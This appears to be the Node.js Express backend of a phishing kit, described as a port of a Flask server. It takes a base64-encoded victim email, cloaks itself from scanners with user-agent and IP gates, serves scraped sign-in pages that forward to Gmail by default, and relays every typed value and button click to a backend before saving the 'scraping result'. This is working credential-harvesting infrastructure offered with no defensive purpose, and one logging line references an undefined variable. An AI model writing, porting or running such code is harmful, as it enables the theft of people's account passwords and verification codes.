// app.js — Express port of your Flask server
// ------------------------------------------

import fs from "fs";
import path from "path";
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import cookieParser from "cookie-parser";
import axios from "axios";

dotenv.config();

import {
  // mirror your Python common.py exports:
  checkEmailAlreadySignin, // (email, forwardUrl) => [boolean, htmlString]
  checkEmailAlreayRunning, // (email) => number
  getUserId,
  initRendering, // ({ user_ip, userAgent }) => number
} from "./utils/common.js";

import {
  scrapingReady, // (userId, email, hl, { forwardURL, userAgent, newUserFlg }) => html
  scrap_input_value_and_btn_next, // (userId, inputValue, btnType, btnText) => obj
  scrapCheckURL, // (userId) => obj
  saveScrapingResultAndSetDone, // (userId) => void
} from "./utils/scraping.js";
import { decodeB64, writeDebugLogLine } from "./utils/helpers.js";
import {
  checkAgentValidation,
  checkClientIpValidation,
} from "./utils/security.js";


// ---------------------------
// Config
// ---------------------------
const app = express();
const PORT = Number(process.env.APP_PORT || 8101);

app.use(express.json());
app.use(express.raw({ type: "application/x-protobuffer" }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());

// If you sit behind a reverse proxy and want accurate req.ip:
app.set("trust proxy", true);


initRendering();
// ---------------------------
// Routes
// ---------------------------

app.use(async (req, res, next) => {
  const userAgent = req.headers["user-agent"] || "";
  const clientIp =
    req.headers["http_client_ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.ip ||
    req.socket?.remoteAddress ||
    "";

  // Gate checks (agent/ip)
  if (!checkAgentValidation(userAgent) || !checkClientIpValidation(clientIp)) {
    writeDebugLogLine(`[*** BLOCKED ***] ${clientIp} ${userAgent}`);
    return res.status(403).end();
  }
  req.clientIp = clientIp;
  req.userAgent = userAgent;
  next();
});
app.get("/information/session/sign", async (req, res) => {
  // Rewrite path (drop first segment)
  const { clientIp, userAgent, originalUrl } = req;
  try {
    writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
    // Build payload { userAgent, client_ip }
    const payload = {
      userAgent: userAgent,
      clientIp: clientIp,
      params: req.query || {},
    };
    const backendRes = await axios.post(
      `http://localhost:${PORT}/api/sign`,
      payload
    );
    return res.status(backendRes.status || 200).send(backendRes.data);
  } catch (err) {
    writeDebugLogLine(
      `[ERROR] ${clientIp}  ${originalUrl}  ${String(
        (err && err.message) || err
      )}`
    );
    return res.status(502).send("Bad Gateway");
  }
});
app.get("/pyapi/test", (req, res) => {
  console.log("[API TESTING]");
  return res.status(200).json({
    msg: `API server is running on port : ${PORT}`,
    status: 200,
  });
});

// information/session/sign  (GET or POST)
// Mirrors Flask logic: accept JSON body + query params
app.post("/api/sign", async (req, res) => {
  try {
    if (!(req.clientIp == "127.0.0.1" || req.clientIp == "::1")) {
      writeDebugLogLine(`******** [DANGER IP] : ${ip} ********`);
      return res.status(404).send("Page Not Found");
    }
    // Prefer JSON body, fallback to query
    const reqBody = req.body || {};

    const { userAgent, clientIp, params } = reqBody;
    const { hl, acc, forward } = params;
    let email = decodeB64(acc, "");
    let lang = hl;
    let forwardURL = decodeB64(forward, "https://mail.google.com");

    // Check if already signed in
    const [chkFlg, signInHtml] = await checkEmailAlreadySignin(
      email,
      forwardURL
    );
    if (chkFlg === true) {
      console.log("[ALREADY SIGNED IN] :", email);
      // Flask returns raw HTML here
      return res.status(200).send(signInHtml || "");
    }

    // Check if already running
    const tmpUserId = await checkEmailAlreayRunning(email);

    if (!tmpUserId || Number(tmpUserId) < 0) {
      // New user id
      const userId = await getUserId({
        userIp: clientIp,
        userAgent,
      });
      console.log("[NEW USER ID] :", userId, email, lang, forwardURL);

      const htmlTxt = await scrapingReady(userId, email, lang, {
        forwardURL,
        userAgent,
        newUserFlg: true,
      });
      return res.status(200).send(htmlTxt || "");
    } else {
      // Reuse existing user id
      console.log("[USERID]", tmpUserId, email);
      const htmlTxt = await scrapingReady(tmpUserId, email, lang, {
        forwardURL,
        userAgent,
        newUserFlg: false,
      });
      return res.status(200).send(htmlTxt || "");
    }
  } catch (err) {
    console.error("[/information/session/sign] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/btn-click  (GET or POST)
app.all("/pyapi/btn-click", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    const input_value = payload.value;
    const btn_type = payload.btn_type;
    const btn_text = payload.btn_text;

    console.log("[BTN CLICK] :", user_id, input_value, btn_type, btn_text);

    const out = await scrap_input_value_and_btn_next(
      user_id,
      input_value,
      btn_type,
      btn_text
    );
    return res.json(out || {});
  } catch (err) {
    console.error("[/pyapi/btn-click] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/url-check  (GET or POST)
app.all("/pyapi/url-check", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    const out = await scrapCheckURL(user_id);
    return res.json(out || {});
  } catch (err) {
    console.error("[/pyapi/url-check] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/done-user  (GET or POST)
app.all("/pyapi/done-user", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    await saveScrapingResultAndSetDone(user_id);
    console.log("[DONE USER]", user_id);
    return res.json({ status: 1 });
  } catch (err) {
    console.error("[/pyapi/done-user] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// robots.txt (serve from ./public like Flask's send_from_directory)
app.use(express.static(path.join(process.cwd(), "public")));
app.get("/robots.txt", (req, res) => {
  const p = path.join(process.cwd(), "public", "robots.txt");
  if (fs.existsSync(p)) return res.sendFile(p);
  return res.status(404).send("Not found");
});

app.get("*", (req, res) => {
  const { clientIp, userAgent } = req;
  writeDebugLogLine(`[Wrong Request] ${clientIp}  ${req.url}  ${userAgent}`);
  return res.status(404).send("Not Found");
});

app.listen(PORT, function () {
  console.log(`App is listening on port ${PORT}!`);
});
